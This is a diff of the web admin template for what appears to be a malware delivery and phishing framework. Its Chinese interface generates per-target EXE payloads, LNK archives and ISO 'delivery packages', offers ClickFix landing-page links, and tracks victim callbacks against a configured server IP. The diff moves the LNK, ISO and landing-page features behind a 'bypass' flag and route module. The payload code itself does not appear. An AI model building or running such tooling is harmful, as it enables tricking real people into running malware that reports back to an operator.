@@ -41,16 +41,18 @@
                 <svg class="icon" aria-hidden="true"><use href="#i-zap"></use></svg>
                 批量生成 EXE
             </button>
+            {% if bypass_enabled %}
             <button class="btn btn-secondary btn-sm" type="button" onclick="batchBuildLnk()" {% if not server_configured %}disabled title="请先在 EXE 配置页面设置服务器 IP"{% endif %}>
                 <svg class="icon" aria-hidden="true"><use href="#i-archive"></use></svg>
                 批量生成 LNK
             </button>
+            {% endif %}
             <button class="btn btn-danger btn-sm" type="button" onclick="batchDelete()">
                 <svg class="icon" aria-hidden="true"><use href="#i-trash"></use></svg>
                 批量删除
             </button>
             <form class="inline-form" action="{{ url_for('routes_web.delete_all_exe') }}" method="POST"
-                  data-confirm="确认删除所有已生成的 EXE、LNK、ISO 投递包？此操作不可撤销。" data-confirm-danger data-confirm-ok="删除">
+                  data-confirm="{% if bypass_enabled %}确认删除所有已生成的 EXE、LNK、ISO 投递包？此操作不可撤销。{% else %}确认删除所有已生成的 EXE？此操作不可撤销。{% endif %}" data-confirm-danger data-confirm-ok="删除">
                 <button class="btn btn-ghost btn-sm danger-text" type="submit">
                     <svg class="icon" aria-hidden="true"><use href="#i-x"></use></svg>
                     清除所有生成文件
@@ -74,7 +76,7 @@
                     <th>Token</th>
                     <th>状态</th>
                     <th>点击</th>
-                    {% if landing_enabled %}<th>落地页</th>{% endif %}
+                    {% if bypass_enabled and landing_enabled %}<th>落地页</th>{% endif %}
                     <th class="hide-sm">创建时间</th>
                     <th>操作</th>
                 </tr>
@@ -111,7 +113,7 @@
                         {% endif %}
                     </td>
                     <td class="num">{{ t.callback_count }}</td>
-                    {% if landing_enabled %}
+                    {% if bypass_enabled and landing_enabled %}
                     <td>
                         <div class="landing-cell">
                             <button class="copy-chip" type="button" data-copy="{{ t.landing_url }}" title="复制 ClickFix 落地页链接">
@@ -137,6 +139,7 @@
                                     {% if not server_configured %}disabled title="请先在 EXE 配置页面设置服务器 IP"{% endif %}>
                                 {% if t.exe_exists %}重新生成{% else %}生成 EXE{% endif %}
                             </button>
+                            {% if bypass_enabled %}
                             <button id="btn-lnk-{{ t.id }}" class="btn btn-secondary btn-sm" type="button"
                                     data-default-label="{% if t.lnk_exists %}重新生成 LNK{% else %}生成 LNK{% endif %}"
                                     onclick="buildLnkPackage({{ t.id }})"
@@ -144,6 +147,7 @@
                                 <svg class="icon" aria-hidden="true"><use href="#i-archive"></use></svg>
                                 {% if t.lnk_exists %}重新生成 LNK{% else %}生成 LNK{% endif %}
                             </button>
+                            {% endif %}
                             <span id="exe-actions-{{ t.id }}" class="row-actions" {% if not t.exe_exists %}style="display:none;"{% endif %}>
                                 <a id="btn-dl-{{ t.id }}" class="btn btn-ghost btn-sm" href="{{ url_for('routes_web.download_exe_from_target', target_id=t.id) }}" title="下载 EXE">
                                     <svg class="icon" aria-hidden="true"><use href="#i-download"></use></svg>
@@ -155,17 +159,19 @@
                                     </button>
                                 </form>
                             </span>
+                            {% if bypass_enabled %}
                             <span id="lnk-actions-{{ t.id }}" class="row-actions" {% if not t.lnk_exists %}style="display:none;"{% endif %}>
-                                <a id="btn-dl-lnk-{{ t.id }}" class="btn btn-ghost btn-sm" href="{{ url_for('routes_web.download_lnk_from_target', target_id=t.id) }}" title="下载 LNK 压缩包">
+                                <a id="btn-dl-lnk-{{ t.id }}" class="btn btn-ghost btn-sm" href="{{ url_for('routes_bypass.download_lnk_from_target', target_id=t.id) }}" title="下载 LNK 压缩包">
                                     <svg class="icon" aria-hidden="true"><use href="#i-archive"></use></svg>
                                 </a>
-                                <form class="inline-form" action="{{ url_for('routes_web.delete_lnk_from_target', target_id=t.id) }}" method="POST"
+                                <form class="inline-form" action="{{ url_for('routes_bypass.delete_lnk_from_target', target_id=t.id) }}" method="POST"
                                       data-confirm="确认删除该目标的 LNK 压缩包？" data-confirm-danger data-confirm-ok="删除">
                                     <button class="btn btn-ghost btn-sm danger-text" type="submit" title="删除该目标的 LNK 压缩包">
                                         <svg class="icon" aria-hidden="true"><use href="#i-trash"></use></svg>
                                     </button>
                                 </form>
                             </span>
+                            {% endif %}
                             <form class="inline-form" action="{{ url_for('routes_web.delete_target', target_id=t.id) }}" method="POST"
                                   data-confirm="确认删除目标「{{ t.name }}」及其所有关联数据？" data-confirm-danger data-confirm-ok="删除">
                                 <button class="btn btn-danger btn-sm" type="submit">删除</button>
@@ -278,6 +284,7 @@ function batchBuild() {
         });
 }
 
+{% if bypass_enabled %}
 function batchBuildLnk() {
     {% if not server_configured %}notify('请先在 EXE 配置页面设置服务器 IP', 'error'); return;{% endif %}
     var ids = getCheckedIds();
@@ -324,6 +331,7 @@ function batchBuildLnk() {
             notify('批量生成 LNK 请求失败', 'error');
         });
 }
+{% endif %}
 
 function buildExe(targetId) {
     {% if not server_configured %}notify('请先在 EXE 配置页面设置服务器 IP', 'error'); return;{% endif %}
@@ -350,6 +358,7 @@ function buildExe(targetId) {
         });
 }
 
+{% if bypass_enabled %}
 function buildLnkPackage(targetId) {
     {% if not server_configured %}notify('请先在 EXE 配置页面设置服务器 IP', 'error'); return;{% endif %}
     var btn = document.getElementById('btn-lnk-' + targetId);
@@ -375,6 +384,7 @@ function buildLnkPackage(targetId) {
             btn.textContent = defaultLabel;
         });
 }
+{% endif %}
 
 function refreshAllStatus() {
     fetch('{{ admin_path }}/build_status_all')
